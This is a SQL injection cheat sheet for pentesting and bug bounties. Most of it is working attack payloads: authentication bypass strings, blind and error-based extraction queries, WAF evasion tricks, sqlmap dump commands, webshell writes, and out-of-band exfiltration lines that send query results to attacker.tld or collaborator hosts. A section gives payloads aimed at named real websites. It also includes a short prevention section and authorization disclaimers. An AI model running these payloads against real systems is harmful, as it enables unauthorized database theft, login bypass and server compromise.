# Definitive SQL Injection Cheat Sheet (Bug Bounty and Pentest Edition)

This guide combines practical methodology and cross-DBMS payloads to help you discover, enumerate, and exploit SQL injection during assessments. Use only with explicit authorization. For background reading and variations, see the Invicti SQL Injection Cheat Sheet (`https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/`) and OWASP references.

## 0) Quick Triage Workflow

1. Identify injection surface: every input sink (query params, POST body, JSON, headers, cookies, path, hidden fields).
2. Probe safely: inject a single quote `'`, double quote `"`, parentheses `)`, and a trailing comment to detect breaks and truncation.
3. Determine behavior type:
   - Error-based: visible database error on bad syntax.
   - Boolean-based blind: content/response length changes when condition is true/false.
   - Time-based blind: server response delays on condition via sleep.
4. Fingerprint DBMS: comment styles, concatenation, version functions, sleep primitives.
5. Pick exploitation track:
   - In-band (UNION) if results are reflected.
   - Error-based if errors leak data.
   - Blind boolean/time if no in-band data.
   - Stacked queries and out-of-band (DNS/HTTP) if permitted.

## 1) Fingerprinting the DBMS

- Comments and string concatenation often reveal the platform. Try minimal no-op payloads:
  - Comments: `-- `, `/*...*/`, `#` (MySQL only)
  - Concatenation: Oracle/PSQL `'||'`; SQL Server `'+'`; MySQL `CONCAT()` or `'a' 'b'` (space)
- Version checks:
  - Oracle: `SELECT banner FROM v$version` or `SELECT version FROM v$instance`
  - SQL Server: `SELECT @@version`
  - PostgreSQL: `SELECT version()`
  - MySQL: `SELECT @@version`
- Sleep primitives for time-based detection:
  - Oracle: `dbms_pipe.receive_message(('a'),10)`
  - SQL Server: `WAITFOR DELAY '0:0:10'`
  - PostgreSQL: `SELECT pg_sleep(10)`
  - MySQL: `SELECT SLEEP(10)`

## 2) Detecting Injection (Safe Probes)

- Breakers: `'`, `"`, `)`, `))`, combined with comments `-- ` or `/*` to truncate.
- Boolean toggles:
  - True: `AND 1=1`
  - False: `AND 1=2`
  - Observe response differences (status, length, wording).
- Time-based toggles:
  - MySQL: `AND IF(1=1,SLEEP(5),0)` vs `AND IF(1=2,SLEEP(5),0)`
  - SQL Server: `; IF(1=1) WAITFOR DELAY '0:0:5'--`
  - PostgreSQL: `AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END`
  - Oracle: `AND CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual`

## 3) Determine Context and Column Count (for UNION)

1. Confirm result reflection: does adding `ORDER BY` change errors? Does page show query results?
2. Find column count (n):
   - Increment `ORDER BY 1`, `ORDER BY 2`, ... until error to find max; n is last OK.
   - Alternatively: `UNION SELECT NULL` repeated until it works (match n NULLs).
3. Find printable columns: replace one `NULL` at a time with a string (or `version()`), identify which positions render.
4. Use a trailing comment to truncate: `-- ` or `/*` where supported.

Example (MySQL, n=3, second column prints):
```sql
' UNION SELECT NULL, @@version, NULL-- 
```

## 4) Exploitation Techniques

### 4.1 UNION-based (in-band)

Step-by-step once n and printable columns are known:
1. Echo DB/database/user:
   - MySQL: `SELECT database(), user(), @@version`
   - SQL Server: `SELECT DB_NAME(), SYSTEM_USER, @@version`
   - PostgreSQL: `SELECT current_database(), current_user, version()`
2. Enumerate schema (see Section 5) and concatenate multiple fields into one printable column using DBMS-specific concatenation.
3. Extract targeted rows using `LIMIT/OFFSET` or `TOP`.

### 4.2 Error-based

Force the database to throw conversion/XML/arith errors that leak data:
- SQL Server:
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))-- 
```
- PostgreSQL:
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- 
```
- MySQL (XML functions):
```sql
' AND EXTRACTVALUE(1, CONCAT(0x5c,(SELECT database())))-- 
```

### 4.3 Blind Boolean-based

Infer data bit-by-bit:
```sql
-- Example (MySQL): test length of database() = 8
' AND LENGTH(database())=8-- 

-- Example (PostgreSQL): test one char
' AND ASCII(SUBSTRING((SELECT current_user),1,1))>77-- 
```
Use binary search on ASCII to minimize requests.

### 4.4 Blind Time-based

Delay only when condition true:
```sql
-- MySQL
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>77,SLEEP(5),0)-- 

-- SQL Server
'; IF(ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '0:0:5'-- 

-- PostgreSQL
' AND CASE WHEN (ASCII(SUBSTRING((SELECT current_user),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
```

### 4.5 Stacked/Batched Queries

- SQL Server and PostgreSQL generally allow `;` separated statements. MySQL often disallows stacked queries via client libraries; Oracle does not support SQL stacking in the same way.
- Use stacked queries for out-of-band actions (DNS) or write-based effects when no in-band channel exists.

### 4.6 Out-of-Band (DNS/HTTP) Exfiltration

- SQL Server: `xp_dirtree` to UNC path triggers DNS/SMB lookup.
```sql
DECLARE @p varchar(128) = (SELECT TOP 1 name FROM sys.databases);
EXEC('master..xp_dirtree "\\\\'+@p+'.attacker.tld\\a"');
```
- PostgreSQL: `COPY ... TO PROGRAM` can call `nslookup`.
```sql
COPY (SELECT current_user) TO PROGRAM 'nslookup attacker.tld';
```
- Oracle: `EXTRACTVALUE` XXE or `UTL_INADDR.get_host_address()` (privilege-dependent).
- MySQL (Windows): `LOAD_FILE('\\\\attacker.tld\\a')` or `SELECT ... INTO OUTFILE` to UNC.

## 5) Schema Enumeration (Cross-DBMS)

List tables/columns using information schema catalogs.

- Oracle:
```sql
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
```
- SQL Server:
```sql
SELECT table_schema, table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```
- PostgreSQL:
```sql
SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema');
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```
- MySQL:
```sql
SELECT table_schema, table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

Helpful extras:
- Current DB/user:
  - MySQL: `SELECT database(), user();`
  - SQL Server: `SELECT DB_NAME(), SYSTEM_USER;`
  - PostgreSQL: `SELECT current_database(), current_user;`
  - Oracle: `SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual;`

## 6) Common Goals and Patterns

- Authentication bypass (unsafe string interpolation):
```sql
' OR 1=1-- 
" OR "1"="1"-- 
') OR ('1'='1'-- 
```
- Read files / write webshells (privilege/OS dependent):
  - MySQL: `LOAD_FILE('/etc/passwd')`; `SELECT 'payload' INTO OUTFILE '/var/www/html/shell.php'`
  - SQL Server: `xp_cmdshell` (often disabled); `BULK INSERT` for read
  - PostgreSQL: `COPY table FROM '/path/file'` (requires superuser)
  - Oracle: directory objects with `UTL_FILE`

## 7) WAF Evasion and Payload Mutation

- Spacing: use comments or alternative whitespace: `UNI/**/ON SEL/**/ECT`, `/*!50000SELECT*/` (MySQL).
- Case and keyword splitting: `SeLeCt`, `UN/**/ION`.
- String building: `CHAR()`/`CHR()` or hex: `0x61646d696e`.
- Concatenation variants: `'||'`, `'+'`, `CONCAT()`, `'a' 'b'`.
- Encodings: URL double-encoding, Unicode homoglyphs, mixed quotes.
- Logical rewriting: `(SELECT 1)=(SELECT 1)` instead of `1=1`.
- Comment tails to truncate original query: `-- ` or `/*`.

## 8) Tool-assisted Exploitation (sqlmap quick reference)

Base:
```bash
sqlmap -u "https://target.tld/items.php?id=1" --batch
```
POST/JSON:
```bash
sqlmap -u "https://target.tld/api" --data '{"id":1}' --batch --headers "Content-Type: application/json"
```
Technique selection and DBMS hinting:
```bash
sqlmap -u URL --technique=U --dbms=mysql --batch
sqlmap -u URL --technique=BEUST --level 5 --risk 3 --batch
```
Enumeration:
```bash
sqlmap -u URL --current-user --current-db --hostname
sqlmap -u URL --dbs
sqlmap -u URL -D target_db --tables
sqlmap -u URL -D target_db -T users --columns
sqlmap -u URL -D target_db -T users --dump
```
Tamper/evasion:
```bash
sqlmap -u URL --tamper=space2comment,between,randomcase --level 5 --risk 3
```
Out-of-band / DNS:
```bash
sqlmap -u URL --dns-domain attacker.tld
```

## 9) Prevention and Remediation (for reports)

- Use parameterized queries/prepared statements. Avoid string concatenation for SQL.
- Enforce least-privilege DB accounts; separate read-only from write/DDL.
- Centralize input handling and server-side validation; disable ORM unsafe raw queries.
- Return generic errors to users; log detailed errors server-side only.
- Security headers and rate limiting to reduce blind probing surface; WAF as defense-in-depth.
- Secret management; do not expose stack traces or banners in production.

## 10) Real-world URL and Request Examples

Educational examples demonstrating time-based blind payloads in practical contexts. Use only with explicit authorization.

### InnoGames — path-based time-based blind (MySQL)

- URL probe (sleep if injectable):
```
https://www.innogames.com/'xor(if(now()=sysdate(),sleep(10),0))or'
```
- Enumerate DB name (first character equals 'A' = 0x41):
```
https://www.innogames.com/'xor(if(mid(database(),1,1)=0x41,sleep(63),0))or'
```

### Zomato — POST-body time-based blind (MySQL)

- HTTP request:
```
POST /php/geto2banner HTTP/1.1
Host: www.zomato.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
```

### U.S. DoD — query-parameter time-based blind (PostgreSQL)

- URL probe (sleep if injectable):
```
https://<redacted>.gov/viewVideo.asp?t=pg_sleep(30)--
```

### InsideOk — POST-parameter time-based blind (MySQL)

- HTTP request:
```
POST /api/updateShareCount HTTP/1.1
Host: insideok.ru
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 108

type=sharesCountTw&url=http%3a%2f%2finsideok.ru%2flica&count=-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A))
```

---

## Appendix A: Cross-DBMS Syntax Reference

### String concatenation
```
Oracle	'foo'||'bar'
Microsoft	'foo'+'bar'
PostgreSQL	'foo'||'bar'
MySQL	'foo' 'bar'  
CONCAT('foo','bar')
```

### Substring
```
Oracle	SUBSTR('foobar', 4, 2)
Microsoft	SUBSTRING('foobar', 4, 2)
PostgreSQL	SUBSTRING('foobar', 4, 2)
MySQL	SUBSTRING('foobar', 4, 2)
```

### Comments
```
Oracle	--comment
Microsoft	--comment
/*comment*/
PostgreSQL	--comment
/*comment*/
MySQL	#comment
-- comment  
/*comment*/
```

### Database version
```
Oracle	SELECT banner FROM v$version
SELECT version FROM v$instance
Microsoft	SELECT @@version
PostgreSQL	SELECT version()
MySQL	SELECT @@version
```

### Database contents
```
Oracle	SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
Microsoft	SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
PostgreSQL	SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
MySQL	SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

### Conditional errors
```
Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
PostgreSQL	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
MySQL	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
```

### Extracting data via visible error messages
```
Microsoft	SELECT 'foo' WHERE 1 = (SELECT 'secret')
> Conversion failed when converting the varchar value 'secret' to data type int.
PostgreSQL	SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
> invalid input syntax for integer: "secret"
MySQL	SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
> XPATH syntax error: '\secret'
```

### Batched (or stacked) queries
```
Oracle	Does not support batched queries.
Microsoft	QUERY-1-HERE; QUERY-2-HERE
QUERY-1-HERE QUERY-2-HERE
PostgreSQL	QUERY-1-HERE; QUERY-2-HERE
MySQL	QUERY-1-HERE; QUERY-2-HERE
``` 
Note: MySQL stacked queries are often blocked by connectors; occasionally possible via specific PHP/Python APIs.

### Time delays
```
Oracle	dbms_pipe.receive_message(('a'),10)
Microsoft	WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT pg_sleep(10)
MySQL	SELECT SLEEP(10)
```

### Conditional time delays
```
Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
Microsoft	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
MySQL	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
```

### DNS lookup primitives

Oracle (XXE, legacy/unpatched) and network UTLs:
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```
SQL Server:
```
EXEC master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```
PostgreSQL:
```
COPY (SELECT '') TO PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```
MySQL (Windows):
``` 
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'
```

### DNS lookup with data exfiltration

Oracle:
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```
SQL Server:
```
DECLARE @p varchar(1024); SET @p=(SELECT YOUR-QUERY-HERE); EXEC('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```
PostgreSQL:
```
CREATE OR REPLACE FUNCTION f() RETURNS void AS $$
DECLARE c text; DECLARE p text; BEGIN
SELECT INTO p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
EXECUTE c; END; $$ LANGUAGE plpgsql SECURITY DEFINER; SELECT f();
```
MySQL (Windows):
```
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'
```

## References

- Invicti: SQL Injection Cheat Sheet (`https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/`)
- OWASP: Injection Prevention Cheat Sheet (`https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html`)
- PortSwigger Academy: SQL Injection labs and write-ups (`https://portswigger.net/web-security/sql-injection`)